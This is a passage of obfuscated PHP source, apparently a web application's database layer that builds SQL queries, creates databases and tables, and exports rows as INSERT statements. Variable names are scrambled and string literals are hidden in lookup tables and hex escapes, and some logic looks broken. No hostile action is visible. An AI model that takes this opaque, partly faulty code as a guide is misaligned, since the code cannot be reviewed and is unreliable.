$ÍëÆßĞá ? $ª¹åßèÙ[$ª®¹ÀÌ‘] : $ª¹åßèÙ; $ÎòûÍƒ®[] = $¢àÄ—³Ä[337] . $this->parseWhereItem($this->parseKey($Òæ€”³), $ª°€õ¥İ) . $¢àÄ—³Ä[968]; } $Ï¦Çàõ .= implode($¢àÄ—³Ä[1067], $ÎòûÍƒ®); } else { $Ï¦Çàõ .= $this->parseWhereItem($this->parseKey($«¥¶à¿°), $ª¹åßèÙ); } } $Ï¦Çàõ .= $¢àÄ—³Ä[355] . $ÜÄı¡÷Ò; } $Ï¦Çàõ = substr($Ï¦Çàõ, 0, -strlen($ÜÄı¡÷Ò)); } return empty($Ï¦Çàõ) ? $¢àÄ—³Ä[12] : $¢àÄ—³Ä[1073] . $Ï¦Çàõ; } protected function parseWhereItem($ığğ¦™ä, $ÉŸ˜Æ¡÷) { $šûí’ßà =& $_SERVER[óÔë„ú]; $Şä¸¶äÌ = $šûí’ßà[12]; if (is_array($ÉŸ˜Æ¡÷)) { if (is_string($ÉŸ˜Æ¡÷[0])) { $ì°¤â·í = strtolower($ÉŸ˜Æ¡÷[0]); if (in_array($ÉŸ˜Æ¡÷[0], array($šûí’ßà[947], $šûí’ßà[1074], $šûí’ßà[1075], $šûí’ßà[1076], $šûí’ßà[1077], $šûí’ßà[1078]))) { $Şä¸¶äÌ .= $ığğ¦™ä . $šûí’ßà[53] . $ÉŸ˜Æ¡÷[0] . $šûí’ßà[53] . $this->parseValue($ÉŸ˜Æ¡÷[1]); } elseif (preg_match($šûí’ßà[1079], $ÉŸ˜Æ¡÷[0])) { $Şä¸¶äÌ .= $ığğ¦™ä . $šûí’ßà[53] . $this->exp[$ì°¤â·í] . $šûí’ßà[53] . $this->parseValue($ÉŸ˜Æ¡÷[1]); } elseif (preg_match($šûí’ßà[1080], $ÉŸ˜Æ¡÷[0])) { if (is_array($ÉŸ˜Æ¡÷[1])) { $Í›¬Ñ¶ü = isset($ÉŸ˜Æ¡÷[2]) ? strtoupper($ÉŸ˜Æ¡÷[2]) : $šûí’ßà[1065]; if (in_array($Í›¬Ñ¶ü, array($šûí’ßà[1064], $šûí’ßà[1065], $šûí’ßà[1066]))) { $®åÁèŸº = array(); foreach ($ÉŸ˜Æ¡÷[1] as $Ğ£ì¢Ã×) { $®åÁèŸº[] = $ığğ¦™ä . $šûí’ßà[53] . $this->exp[$ì°¤â·í] . $šûí’ßà[53] . $this->parseValue($Ğ£ì¢Ã×); } $Şä¸¶äÌ .= $šûí’ßà[337] . implode($šûí’ßà[53] . $Í›¬Ñ¶ü . $šûí’ßà[53], $®åÁèŸº) . $šûí’ßà[968]; } } else { $Şä¸¶äÌ .= $ığğ¦™ä . $šûí’ßà[53] . $this->exp[$ì°¤â·í] . $šûí’ßà[53] . $this->parseValue($ÉŸ˜Æ¡÷[1]); } } elseif ($šûí’ßà[373] == $ì°¤â·í) { $Şä¸¶äÌ .= $šûí’ßà[966] . $ığğ¦™ä . $šûí’ßà[53] . $ÉŸ˜Æ¡÷[1] . $šûí’ßà[1081]; } elseif (preg_match($šûí’ßà[1082], $ÉŸ˜Æ¡÷[0])) { $Şä¸¶äÌ .= $ÉŸ˜Æ¡÷[0]; } elseif (preg_match($šûí’ßà[1083], $ÉŸ˜Æ¡÷[0])) { if (isset($ÉŸ˜Æ¡÷[2]) && $šûí’ßà[373] == $ÉŸ˜Æ¡÷[2]) { $Şä¸¶äÌ .= $ığğ¦™ä . $šûí’ßà[53] . $this->exp[$ì°¤â·í] . $šûí’ßà[53] . $ÉŸ˜Æ¡÷[1]; } else { if (is_string($ÉŸ˜Æ¡÷[1])) { $ÉŸ˜Æ¡÷[1] = explode($šûí’ßà[50], $ÉŸ˜Æ¡÷[1]); } $”àêôÍ = implode($šûí’ßà[50], $this->parseValue($ÉŸ˜Æ¡÷[1])); $Şä¸¶äÌ .= $ığğ¦™ä . $šûí’ßà[53] . $this->exp[$ì°¤â·í] . $šûí’ßà[966] . $”àêôÍ . $šûí’ßà[968]; } } elseif (preg_match($šûí’ßà[1084], $ÉŸ˜Æ¡÷[0])) { $å‡¡ûÌñ = is_string($ÉŸ˜Æ¡÷[1]) ? explode($šûí’ßà[50], $ÉŸ˜Æ¡÷[1]) : $ÉŸ˜Æ¡÷[1]; $Şä¸¶äÌ .= $šûí’ßà[966] . $ığğ¦™ä . $šûí’ßà[53] . $this->exp[$ì°¤â·í] . $šûí’ßà[53] . $this->parseValue($å‡¡ûÌñ[0]) . $šûí’ßà[1067] . $this->parseValue($å‡¡ûÌñ[1]) . $šûí’ßà[355]; } else { think_exception(think_lang($šûí’ßà[1070]) . $šûí’ßà[4] . $ÉŸ˜Æ¡÷[0]); } } else { $ÁïıÜ·È = count($ÉŸ˜Æ¡÷); $‹¿ ¡ı˜ = $šûí’ßà[12]; if (is_string($ÉŸ˜Æ¡÷[$ÁïıÜ·È - 1])) { $‹¿ ¡ı˜ = isset($ÉŸ˜Æ¡÷[$ÁïıÜ·È - 1]) ? strtoupper($ÉŸ˜Æ¡÷[$ÁïıÜ·È - 1]) : $šûí’ßà[12]; if (in_array($‹¿ ¡ı˜, array($šûí’ßà[1064], $šûí’ßà[1065], $šûí’ßà[1066]))) { $ÁïıÜ·È = $ÁïıÜ·È - 1; } } else { $‹¿ ¡ı˜ = $šûí’ßà[1064]; } for ($ıÎ›ê– = 0; $ıÎ›ê– < $ÁïıÜ·È; $ıÎ›ê–++) { $å‡¡ûÌñ = is_array($ÉŸ˜Æ¡÷[$ıÎ›ê–]) ? $ÉŸ˜Æ¡÷[$ıÎ›ê–][1] : $ÉŸ˜Æ¡÷[$ıÎ›ê–]; if ($šûí’ßà[373] == strtolower($ÉŸ˜Æ¡÷[$ıÎ›ê–][0])) { $Şä¸¶äÌ .= $šûí’ßà[337] . $ığğ¦™ä . $šûí’ßà[53] . $å‡¡ûÌñ . $šûí’ßà[1081] . $‹¿ ¡ı˜ . $šûí’ßà[53]; } else { $òĞÜÈ™¿ = is_array($ÉŸ˜Æ¡÷[$ıÎ›ê–]) ? $this->exp[strtolower($ÉŸ˜Æ¡÷[$ıÎ›ê–][0])] : $šûí’ßà[947]; if (!$òĞÜÈ™¿ && is_array($ÉŸ˜Æ¡÷[$ıÎ›ê–]) && in_array($ÉŸ˜Æ¡÷[$ıÎ›ê–][0], array($šûí’ßà[947], $šûí’ßà[1074], $šûí’ßà[1075], $šûí’ßà[1076], $šûí’ßà[1077], $šûí’ßà[1078]))) { $òĞÜÈ™¿ = $ÉŸ˜Æ¡÷[$ıÎ›ê–][0]; } $Şä¸¶äÌ .= $šûí’ßà[337] . $ığğ¦™ä . $šûí’ßà[53] . $òĞÜÈ™¿ . $šûí’ßà[53] . $this->parseValue($å‡¡ûÌñ) . $šûí’ßà[1081] . $‹¿ ¡ı˜ . $šûí’ßà[53]; } } $Şä¸¶äÌ = substr($Şä¸¶äÌ, 0, -4); } } else { $Şä¸¶äÌ .= $ığğ¦™ä . $šûí’ßà[1085] . $this->parseValue($ÉŸ˜Æ¡÷); } return $Şä¸¶äÌ; } protected function parseThinkWhere($Æú¥ÀÆò, $„°Õ½èğ) { $šÚéí†¤ =& $_SERVER[óÔë„ú]; $—ìüèÒ¬ = $šÚéí†¤[12]; switch ($Æú¥ÀÆò) { case $šÚéí†¤[428]: $—ìüèÒ¬ = $„°Õ½èğ; break; case $šÚéí†¤[1068]: $—ìüèÒ¬ = is_string($„°Õ½èğ) ? $„°Õ½èğ : substr($this->parseWhere($„°Õ½èğ), 6); break; case $šÚéí†¤[1086]: parse_str($„°Õ½èğ, $†Õ‹×Ç†); if (isset($†Õ‹×Ç†[$šÚéí†¤[1063]])) { $õÕ°Ùù½ = $šÚéí†¤[53] . strtoupper($†Õ‹×Ç†[$šÚéí†¤[1063]]) . $šÚéí†¤[53]; unset($†Õ‹×Ç†[$šÚéí†¤[1063]]); } else { $õÕ°Ùù½ = $šÚéí†¤[1067]; } $«ŞÅğíÃ = array(); foreach ($†Õ‹×Ç† as $Ó“šˆŸ => $‡öÏË‘¿) { $«ŞÅğíÃ[] = $this->parseKey($Ó“šˆŸ) . $šÚéí†¤[1085] . $this->parseValue($‡öÏË‘¿); } $—ìüèÒ¬ = implode($õÕ°Ùù½, $«ŞÅğíÃ); break; } return $—ìüèÒ¬; } protected function parseLimit($ì…òô„•) { $ÀîåÌâ =& $_SERVER[óÔë„ú]; return !empty($ì…òô„•) ? $ÀîåÌâ[51] . $ì…òô„• . $ÀîåÌâ[53] : $ÀîåÌâ[12]; } protected function parseJoin($Õ¦«È˜ş) { $›àâÁÌå =& $_SERVER[óÔë„ú]; $Í¼œÀİ = $›àâÁÌå[12]; if (!empty($Õ¦«È˜ş)) { if (is_array($Õ¦«È˜ş)) { foreach ($Õ¦«È˜ş as $ãëÑÄè« => $¥¬©ÔÈ°) { if (!1 !== stripos($¥¬©ÔÈ°, $›àâÁÌå[1087])) { $Í¼œÀİ .= $›àâÁÌå[53] . $¥¬©ÔÈ°; } else { $Í¼œÀİ .= $›àâÁÌå[1088] . $¥¬©ÔÈ°; } } } else { $Í¼œÀİ .= $›àâÁÌå[1088] . $Õ¦«È˜ş; } } $Í¼œÀİ = preg_replace($›àâÁÌå[1089], think_config($›àâÁÌå[993]) . $›àâÁÌå[1090], $Í¼œÀİ); return $Í¼œÀİ; } protected function parseOrder($¾”ûÎŒ) { $ıÖ¢•öÓ =& $_SERVER[óÔë„ú]; if (is_array($¾”ûÎŒ)) { $éåğ©× = array(); foreach ($¾”ûÎŒ as $°­›ä½ => $ûÍß) { if (is_numeric($°­›ä½)) { $éåğ©×[] = $this->parseKey($ûÍß); } else { $ûÍß = in_array(strtoupper(trim($ûÍß)), array($ıÖ¢•öÓ[1091], $ıÖ¢•öÓ[1092])) ? $ıÖ¢•öÓ[53] . $ûÍß : $ıÖ¢•öÓ[12]; if (preg_match($ıÖ¢•öÓ[1093], $°­›ä½)) { $éåğ©×[] = $this->parseKey($°­›ä½) . $ûÍß; } else { think_exception($ıÖ¢•öÓ[1094] . $°­›ä½); } } } $¾”ûÎŒ = implode($ıÖ¢•öÓ[50], $éåğ©×); } return !empty($¾”ûÎŒ) ? $ıÖ¢•öÓ[1095] . $¾”ûÎŒ : $ıÖ¢•öÓ[12]; } protected function parseGroup($Ã«¡£ã‡) { $ˆßÌåö =& $_SERVER[óÔë„ú]; return !empty($Ã«¡£ã‡) ? $ˆßÌåö[1096] . $Ã«¡£ã‡ : $ˆßÌåö[12]; } protected function parseHaving($æƒŒÈ¤) { $äÈŞ‚İ€ =& $_SERVER[óÔë„ú]; return !empty($æƒŒÈ¤) ? $äÈŞ‚İ€[1097] . $æƒŒÈ¤ : $äÈŞ‚İ€[12]; } protected function parseComment($öÊ¥…ç) { $´ë™¥Ã =& $_SERVER[óÔë„ú]; return !empty($öÊ¥…ç) ? $´ë™¥Ã[1098] . $öÊ¥…ç . $´ë™¥Ã[1099] : $´ë™¥Ã[12]; } protected function parseDistinct($¾¼³šíä) { $è¾½îƒ¾ =& $_SERVER[óÔë„ú]; return !empty($¾¼³šíä) ? $è¾½îƒ¾[1100] : $è¾½îƒ¾[12]; } protected function parseUnion($¹ôøŞà´) { $Ëê×Àìè =& $_SERVER[óÔë„ú]; if (empty($¹ôøŞà´)) { return $Ëê×Àìè[12]; } if (isset($¹ôøŞà´[$Ëê×Àìè[424]])) { $“œÀõ ô = $Ëê×Àìè[1101]; unset($¹ôøŞà´[$Ëê×Àìè[424]]); } else { $“œÀõ ô = $Ëê×Àìè[1102]; } foreach ($¹ôøŞà´ as $ñ¹ƒïà ) { $à±ıøÑ[] = $“œÀõ ô . (is_array($ñ¹ƒïà ) ? $this->buildSelectSql($ñ¹ƒïà ) : $ñ¹ƒïà ); } return implode($Ëê×Àìè[53], $à±ıøÑ); } public function insert($Î±›Å¹, $ÀüÁ¥–õ = array(), $«Œ¾È‘“ = false) { $Å‚å =& $_SERVER[óÔë„ú]; $ ”ß» = $£óğ…ÖÏ = array(); $this->model = $ÀüÁ¥–õ[$Å‚å[358]]; foreach ($Î±›Å¹ as $æŸ†Şó => $¾·Í­ë) { if (is_array($¾·Í­ë) && $Å‚å[373] == $¾·Í­ë[0]) { $£óğ…ÖÏ[] = $this->parseKey($æŸ†Şó); $ ”ß»[] = $¾·Í­ë[1]; } elseif (is_scalar($¾·Í­ë) || is_null($¾·Í­ë)) { $£óğ…ÖÏ[] = $this->parseKey($æŸ†Şó); $ ”ß»[] = $this->parseValue($¾·Í­ë); } } $½ğÉ³ùÖ = ($«Œ¾È‘“ ? $Å‚å[970] : $Å‚å[971]) . $Å‚å[972] . $this->parseTable($ÀüÁ¥–õ[$Å‚å[356]]) . $Å‚å[966] . implode($Å‚å[50], $£óğ…ÖÏ) . $Å‚å[967] . implode($Å‚å[50], $ ”ß») . $Å‚å[968]; $½ğÉ³ùÖ .= $this->parseLock(isset($ÀüÁ¥–õ[$Å‚å[903]]) ? $ÀüÁ¥–õ[$Å‚å[903]] : !1); $½ğÉ³ùÖ .= $this->parseComment(!empty($ÀüÁ¥–õ[$Å‚å[430]]) ? $ÀüÁ¥–õ[$Å‚å[430]] : $Å‚å[12]); return $this->execute($½ğÉ³ùÖ, $this->parseBind(!empty($ÀüÁ¥–õ[$Å‚å[361]]) ? $ÀüÁ¥–õ[$Å‚å[361]] : array())); } public function selectInsert($Ìê‚ò¥ş, $µâœ‰Å€, $¶ÆĞÚ¦¡ = array()) { $Ä½â–Ç =& $_SERVER[óÔë„ú]; $this->model = $¶ÆĞÚ¦¡[$Ä½â–Ç[358]]; if (is_string($Ìê‚ò¥ş)) { $Ìê‚ò¥ş = explode($Ä½â–Ç[50], $Ìê‚ò¥ş); } array_walk($Ìê‚ò¥ş, array($this, $Ä½â–Ç[969])); $ñÒõæÈˆ = $Ä½â–Ç[1103] . $this->parseTable($µâœ‰Å€) . $Ä½â–Ç[966] . implode($Ä½â–Ç[50], $Ìê‚ò¥ş) . $Ä½â–Ç[1081]; $ñÒõæÈˆ .= $this->buildSelectSql($¶ÆĞÚ¦¡); return $this->execute($ñÒõæÈˆ, $this->parseBind(!empty($¶ÆĞÚ¦¡[$Ä½â–Ç[361]]) ? $¶ÆĞÚ¦¡[$Ä½â–Ç[361]] : array())); } public function update($„Ÿúï†§, $Ç½¥Ï¨) { $Ü¬ŠŠŒÄ =& $_SERVER[óÔë„ú]; $this->model = $Ç½¥Ï¨[$Ü¬ŠŠŒÄ[358]]; $¯×ÃËÊ = $Ü¬ŠŠŒÄ[1104] . $this->parseTable($Ç½¥Ï¨[$Ü¬ŠŠŒÄ[356]]) . $this->parseSet($„Ÿúï†§) . $this->parseWhere(!empty($Ç½¥Ï¨[$Ü¬ŠŠŒÄ[352]]) ? $Ç½¥Ï¨[$Ü¬ŠŠŒÄ[352]] : $Ü¬ŠŠŒÄ[12]) . $this->parseOrder(!empty($Ç½¥Ï¨[$Ü¬ŠŠŒÄ[441]]) ? $Ç½¥Ï¨[$Ü¬ŠŠŒÄ[441]] : $Ü¬ŠŠŒÄ[12]) . $this->parseLimit(!empty($Ç½¥Ï¨[$Ü¬ŠŠŒÄ[368]]) ? $Ç½¥Ï¨[$Ü¬ŠŠŒÄ[368]] : $Ü¬ŠŠŒÄ[12]) . $this->parseLock(isset($Ç½¥Ï¨[$Ü¬ŠŠŒÄ[903]]) ? $Ç½¥Ï¨[$Ü¬ŠŠŒÄ[903]] : !1) . $this->parseComment(!empty($Ç½¥Ï¨[$Ü¬ŠŠŒÄ[430]]) ? $Ç½¥Ï¨[$Ü¬ŠŠŒÄ[430]] : $Ü¬ŠŠŒÄ[12]); return $this->execute($¯×ÃËÊ, $this->parseBind(!empty($Ç½¥Ï¨[$Ü¬ŠŠŒÄ[361]]) ? $Ç½¥Ï¨[$Ü¬ŠŠŒÄ[361]] : array())); } public function delete($ÛÒ›³Íî = array()) { $­Ú¡ä =& $_SERVER[óÔë„ú]; $this->model = $ÛÒ›³Íî[$­Ú¡ä[358]]; $´É–´Ì¶ = $­Ú¡ä[1105] . $this->parseTable($ÛÒ›³Íî[$­Ú¡ä[356]]) . $this->parseWhere(!empty($ÛÒ›³Íî[$­Ú¡ä[352]]) ? $ÛÒ›³Íî[$­Ú¡ä[352]] : $­Ú¡ä[12]) . $this->parseOrder(!empty($ÛÒ›³Íî[$­Ú¡ä[441]]) ? $ÛÒ›³Íî[$­Ú¡ä[441]] : $­Ú¡ä[12]) . $this->parseLimit(!empty($ÛÒ›³Íî[$­Ú¡ä[368]]) ? $ÛÒ›³Íî[$­Ú¡ä[368]] : $­Ú¡ä[12]) . $this->parseLock(isset($ÛÒ›³Íî[$­Ú¡ä[903]]) ? $ÛÒ›³Íî[$­Ú¡ä[903]] : !1) . $this->parseComment(!empty($ÛÒ›³Íî[$­Ú¡ä[430]]) ? $ÛÒ›³Íî[$­Ú¡ä[430]] : $­Ú¡ä[12]); return $this->execute($´É–´Ì¶, $this->parseBind(!empty($ÛÒ›³Íî[$­Ú¡ä[361]]) ? $ÛÒ›³Íî[$­Ú¡ä[361]] : array())); } public function select($Ó´İÁ¯Ÿ = array()) { $…õÑ²š‰ =& $_SERVER[óÔë„ú]; $this->model = $Ó´İÁ¯Ÿ[$…õÑ²š‰[358]]; $·ûö “‚ = $this->buildSelectSql($Ó´İÁ¯Ÿ); $“Ìª§ÓÉ = isset($Ó´İÁ¯Ÿ[$…õÑ²š‰[425]]) ? $Ó´İÁ¯Ÿ[$…õÑ²š‰[425]] : !1; if ($“Ìª§ÓÉ) { $²Òû¨ı = is_string($“Ìª§ÓÉ[$…õÑ²š‰[97]]) ? $“Ìª§ÓÉ[$…õÑ²š‰[97]] : $…õÑ²š‰[1106] . md5($·ûö “‚); $–¹ß³ğô = think_cache($²Òû¨ı, $…õÑ²š‰[12], $“Ìª§ÓÉ); if (!1 !== $–¹ß³ğô) { return $–¹ß³ğô; } } $æ ½µÕ = $this->query($·ûö “‚, $this->parseBind(!empty($Ó´İÁ¯Ÿ[$…õÑ²š‰[361]]) ? $Ó´İÁ¯Ÿ[$…õÑ²š‰[361]] : array())); if ($“Ìª§ÓÉ && !1 !== $æ ½µÕ) { think_cache($²Òû¨ı, $æ ½µÕ, $“Ìª§ÓÉ); } return $æ ½µÕ; } public function buildSelectSql($á®Ğò‹ = array()) { $šâ’Ï¢€ =& $_SERVER[óÔë„ú]; if (isset($á®Ğò‹[$šâ’Ï¢€[429]])) { if (strpos($á®Ğò‹[$šâ’Ï¢€[429]], $šâ’Ï¢€[50])) { list($¯ÖÛËç¬, $¢óäåÛ†) = explode($šâ’Ï¢€[50], $á®Ğò‹[$šâ’Ï¢€[429]]); } else { $¯ÖÛËç¬ = $á®Ğò‹[$šâ’Ï¢€[429]]; } $¯ÖÛËç¬ = $¯ÖÛËç¬ ? $¯ÖÛËç¬ : 1; $¢óäåÛ† = isset($¢óäåÛ†) ? $¢óäåÛ† : (is_numeric($á®Ğò‹[$šâ’Ï¢€[368]]) ? $á®Ğò‹[$šâ’Ï¢€[368]] : 20); $šê´§ØÏ = $¢óäåÛ† * ((int) $¯ÖÛËç¬ - 1); $á®Ğò‹[$šâ’Ï¢€[368]] = $šê´§ØÏ . $šâ’Ï¢€[50] . $¢óäåÛ†; } if (think_config($šâ’Ï¢€[1107])) { $××Îâ—“ = $šâ’Ï¢€[1108] . md5(serialize($á®Ğò‹)); $­ŸàÉ· = think_cache($××Îâ—“); if ($­ŸàÉ·) { return $­ŸàÉ·; } } $êëÍ“ğ‘ = $this->parseSql($this->selectSql, $á®Ğò‹); $êëÍ“ğ‘ .= $this->parseLock(isset($á®Ğò‹[$šâ’Ï¢€[903]]) ? $á®Ğò‹[$šâ’Ï¢€[903]] : !1); if (isset($××Îâ—“)) { think_cache($××Îâ—“, $êëÍ“ğ‘); } return $êëÍ“ğ‘; } public function parseSql($’òÌ‰€, $ˆğØ¤½ù = array()) { $÷Ì¶•‘ =& $_SERVER[óÔë„ú]; $’òÌ‰€ = str_replace(array($÷Ì¶•‘[1109], $÷Ì¶•‘[1110], $÷Ì¶•‘[1111], $÷Ì¶•‘[1112], $÷Ì¶•‘[1113], $÷Ì¶•‘[1114], $÷Ì¶•‘[1115], $÷Ì¶•‘[1116], $÷Ì¶•‘[1117], $÷Ì¶•‘[1118], $÷Ì¶•‘[1119]), array($this->parseTable("{$ˆğØ¤½ù[$÷Ì¶•‘[356]]}"), $this->parseDistinct(isset($ˆğØ¤½ù[$÷Ì¶•‘[1120]]) ? $ˆğØ¤½ù[$÷Ì¶•‘[1120]] : !1), $this->parseField(!empty($ˆğØ¤½ù[$÷Ì¶•‘[350]]) ? $ˆğØ¤½ù[$÷Ì¶•‘[350]] : $÷Ì¶•‘[220]), $this->parseJoin(!empty($ˆğØ¤½ù[$÷Ì¶•‘[359]]) ? $ˆğØ¤½ù[$÷Ì¶•‘[359]] : $÷Ì¶•‘[12]), $this->parseWhere(!empty($ˆğØ¤½ù[$÷Ì¶•‘[352]]) ? $ˆğØ¤½ù[$÷Ì¶•‘[352]] : $÷Ì¶•‘[12]), $this->parseGroup(!empty($ˆğØ¤½ù[$÷Ì¶•‘[578]]) ? $ˆğØ¤½ù[$÷Ì¶•‘[578]] : $÷Ì¶•‘[12]), $this->parseHaving(!empty($ˆğØ¤½ù[$÷Ì¶•‘[1121]]) ? $ˆğØ¤½ù[$÷Ì¶•‘[1121]] : $÷Ì¶•‘[12]), $this->parseOrder(!empty($ˆğØ¤½ù[$÷Ì¶•‘[441]]) ? $ˆğØ¤½ù[$÷Ì¶•‘[441]] : $÷Ì¶•‘[12]), $this->parseLimit(!empty($ˆğØ¤½ù[$÷Ì¶•‘[368]]) ? $ˆğØ¤½ù[$÷Ì¶•‘[368]] : $÷Ì¶•‘[12]), $this->parseUnion(!empty($ˆğØ¤½ù[$÷Ì¶•‘[423]]) ? $ˆğØ¤½ù[$÷Ì¶•‘[423]] : $÷Ì¶•‘[12]), $this->parseComment(!empty($ˆğØ¤½ù[$÷Ì¶•‘[430]]) ? $ˆğØ¤½ù[$÷Ì¶•‘[430]] : $÷Ì¶•‘[12])), $’òÌ‰€); return $’òÌ‰€; } public function getLastSql($üâòºÌä = '') { return $üâòºÌä ? $this->modelSql[$üâòºÌä] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Çôäˆ) { return addslashes($Çôäˆ); } public function setModel($‹›ü°É) { $this->model = $‹›ü°É; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($‹ïø±×å = array()) { $Í©‹Ä¸ =& $_SERVER[óÔë„ú]; if (empty($‹ïø±×å)) { $‹ïø±×å = $GLOBALS[$Í©‹Ä¸[6]][$Í©‹Ä¸[21]]; } $this->database = $‹ïø±×å; } public function model($ÅŞÔšİ = '') { return new ModelBase($ÅŞÔšİ, $_SERVER[óÔë„ú][12], $this->database); } public function db($•øËüª = false) { $¿šîæ© =& $_SERVER[óÔë„ú]; $‹³¥ª¹ = array_change_key_case($this->database); if ($this->dbType() == $¿šîæ©[13] || !$•øËüª) { return $this->model()->db(); } $×»ğ¦¢ = $‹³¥ª¹[$¿šîæ©[1035]]; $‹³¥ª¹[$¿šîæ©[1035]] = $¿šîæ©[12]; if ($‹³¥ª¹[$¿šîæ©[1030]] == $¿šîæ©[1027]) { $ğãÊÏëİ = $‹³¥ª¹[$¿šîæ©[1036]]; $‹³¥ª¹[$¿šîæ©[1036]] = substr($ğãÊÏëİ, 0, strrpos($ğãÊÏëİ, $¿šîæ©[1122])); } $this->database = $‹³¥ª¹; $Ÿæ­âà† = $this->model()->db(); try { $µµ‚­“Ü = $Ÿæ­âà†->execute("\x73\x68\157\167\x20\x64\141\164\x61\x62\x61\x73\x65\163\x20\154\x69\153\x65\x20\47{$×»ğ¦¢}\x27"); } catch (Exception $ÎĞº‰â) { } if (!$µµ‚­“Ü) { $Ÿæ­âà†->execute("\143\x72\145\141\x74\145\40\x64\141\164\x61\x62\x61\163\x65\40\x60{$×»ğ¦¢}\140"); } $‹³¥ª¹[$¿šîæ©[1035]] = $×»ğ¦¢; if ($‹³¥ª¹[$¿šîæ©[1030]] == $¿šîæ©[1027]) { $‹³¥ª¹[$¿šîæ©[1036]] .= $¿šîæ©[1122] . $×»ğ¦¢; } $this->database = $‹³¥ª¹; $Ÿæ­âà†->execute("\165\163\145\x20\x60{$×»ğ¦¢}\140"); return $Ÿæ­âà†; } public function createTable($Ùõ„¨– , &$©ÉÄÊÄ£) { $ÀÉ“èıô =& $_SERVER[óÔë„ú]; if (!IO::exist($Ùõ„¨– )) { ActionCall($ÀÉ“èıô[1123], !0, 0); show_json(LNG($ÀÉ“èıô[1124]), !1); } $Óù¶†Şº = $this->model()->db(); $øçÊŸ²Ê = sqlSplit(IO::getContent($Ùõ„¨– )); foreach ($øçÊŸ²Ê as $¸È×Ñ‹) { $š€ßÊ½‚ = stripos($¸È×Ñ‹, $ÀÉ“èıô[1125]) === 0; if ($š€ßÊ½‚) { $©ÉÄÊÄ£->task[$ÀÉ“èıô[1126]] += 1; } $Óù¶†Şº->execute($¸È×Ñ‹); if ($š€ßÊ½‚) { preg_match($ÀÉ“èıô[1127], $¸È×Ñ‹, $× ƒÕ×£); $©ÉÄÊÄ£->task[$ÀÉ“èıô[1128]] = $× ƒÕ×£[1]; $©ÉÄÊÄ£->update(1); } } } public function insertTable($³°ĞÔ¼é, &$â“©‡î) { $âˆõƒ¡ =& $_SERVER[óÔë„ú]; $í¸è¥òã = $this->model()->db(); $Ìíìøõ£ = $•ƒºÁß… ? array($•ƒºÁß…) : $í¸è¥òã->getTables(); foreach ($³°ĞÔ¼é as $‘Åê½ïî) { $•ƒºÁß… = basename($‘Åê½ïî, $âˆõƒ¡[848]); if (!in_array($•ƒºÁß…, $Ìíìøõ£)) { continue; } $â“©‡î->task[$âˆõƒ¡[1128]] = $•ƒºÁß…; if (get_filesize($‘Åê½ïî) == 0) { continue; } $…ë«Ş» = $this->sqlToDb($‘Åê½ïî, $â“©‡î); if (!$…ë«Ş») { ActionCall($âˆõƒ¡[1123], !0, 0); show_json(LNG($âˆõƒ¡[1129]) . "\x5b{$•ƒºÁß…}\135", !1); } } } public function sqlFromDb($ÇÎÔ“Âô, $•®’‚ÏÃ, &$üƒ¬Õ–Ú, $Äë—µ‡® = '') { if ($üƒ¬Õ–Ú) { $üƒ¬Õ–Ú->task[$_SERVER[óÔë„ú][1128]] = $ÇÎÔ“Âô; } $ğÒ›‚²¦ = $this->model($ÇÎÔ“Âô); $öº¸¯› = 0; $×Û·ôß€ = 0; $Æ¤‚ìÈ = 10000; $‡ûç›Í = fopen($•®’‚ÏÃ, $_SERVER[óÔë„ú][1130]); $éÑÃ½È = $ğÒ›‚²¦->getPk(); $ûÈï³ãÇ = $ğÒ›‚²¦->getDbFields(); $Ù¹ÍçÒÍ = $_SERVER[óÔë„ú][12]; if ($GLOBALS[$_SERVER[óÔë„ú][847]] && in_array($ÇÎÔ“Âô, array($_SERVER[óÔë„ú][1131], $_SERVER[óÔë„ú][1132]))) { $Ù¹ÍçÒÍ = $ÇÎÔ“Âô; } do { $‰º¢ğ ½ = array($éÑÃ½È => array($_SERVER[óÔë„ú][1077], $×Û·ôß€)); $©òŞ¯Àõ = $ğÒ›‚²¦->where($‰º¢ğ ½)->field($ûÈï³ãÇ)->order($éÑÃ½È . $_SERVER[óÔë„ú][1133])->limit($Æ¤‚ìÈ)->select(); $©òŞ¯Àõ = !empty($©òŞ¯Àõ) ? $©òŞ¯Àõ : array(); if (!($ªÏĞ¶ü— = count($©òŞ¯Àõ))) { break; } $¯ÀºØ¬ = end($©òŞ¯Àõ); $×Û·ôß€ = $¯ÀºØ¬[$éÑÃ½È]; $Ù„¥®áÏ = array(); foreach ($©òŞ¯Àõ as $ŠøÃáâš) { if ($Ù¹ÍçÒÍ) { if ($ÇÎÔ“Âô == $_SERVER[óÔë„ú][1131]) { if ($ŠøÃáâš[$_SERVER[óÔë„ú][33]] == $_SERVER[óÔë„ú][1134]) { $ÇÒ´•Óâ = json_decode($ŠøÃáâš[$_SERVER[óÔë„ú][450]], !0); if ($ÇÒ´•Óâ[$_SERVER[óÔë„ú][32]] == $GLOBALS[$_SERVER[óÔë„ú][847]] && $ÇÒ´•Óâ[$_SERVER[óÔë„ú][810]] != 1) { continue; } } } else { if ($ŠøÃáâš[$_SERVER[óÔë„ú][33]] == $_SERVER[óÔë„ú][1135] && $ŠøÃáâš[$_SERVER[óÔë„ú][97]] == $_SERVER[óÔë„ú][842]) { continue; } } } if ($Äë—µ‡®) { $ŠøÃáâš[$_SERVER[óÔë„ú][87]] = "\x7b\151\x6f\72{$Äë—µ‡®}\175" . substr($ŠøÃáâš[$_SERVER[óÔë„ú][87]], strlen("\x7b\151\157\72{$ŠøÃáâš[$_SERVER[óÔë„ú][877]]}\x7d")); $ŠøÃáâš[$_SERVER[óÔë„ú][877]] = $Äë—µ‡®; } $Ù„¥®áÏ[] = $_SERVER[óÔë„ú][1136] . $this->sqlEncode($ŠøÃáâš) . $_SERVER[óÔë„ú][1137]; } $·ÜÛä§Ù = "\x49\x4e\x53\105\122\124\x20\x49\116\x54\117\40\140{$ÇÎÔ“Âô}\x60\40\x28\x60" . implode($_SERVER[óÔë„ú][1138], $ûÈï³ãÇ) . $_SERVER[óÔë„ú][1139]; fwrite($‡ûç›Í, $·ÜÛä§Ù . implode($_SERVER[óÔë„ú][1140], $Ù„¥®áÏ) . $_SERVER[óÔë„ú][74] . PHP_EOL); $öº¸¯› += $ªÏĞ¶ü—; if ($üƒ¬Õ–Ú) { $üƒ¬Õ–Ú->update($ªÏĞ¶ü—); } } while 